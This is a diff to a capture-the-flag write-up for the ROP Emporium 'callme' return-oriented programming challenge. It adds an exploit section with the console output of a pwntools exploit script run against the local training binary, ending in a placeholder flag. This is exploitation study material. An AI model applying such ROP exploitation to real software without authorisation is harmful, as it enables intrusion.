@@ -1,4 +1,4 @@
-# [Callme](https://ropemporium.com/challenge/callme.html)
+# [callme](https://ropemporium.com/challenge/callme.html)
 
 Let's test the program :
 
@@ -135,3 +135,30 @@ gef➤  x/3i 0x400720
 ```
 
 # Exploit
+
+Using [this script](./exploit.py), we get the flag :
+
+```console
+$ python3 exploit.py
+[*] '/home/coucou/Documents/ROP_Emporium/03_callme/callme'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+[+] Starting local process '/home/coucou/Documents/ROP_Emporium/03_callme/callme': pid 8665
+[*] Switching to interactive mode
+callme by ROP Emporium
+x86_64
+
+Hope you read the instructions...
+
+> Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+[*] Process '/home/coucou/Documents/ROP_Emporium/03_callme/callme' stopped with exit code 0 (pid 8665)
+[*] Got EOF while reading in interactive
+$
+```
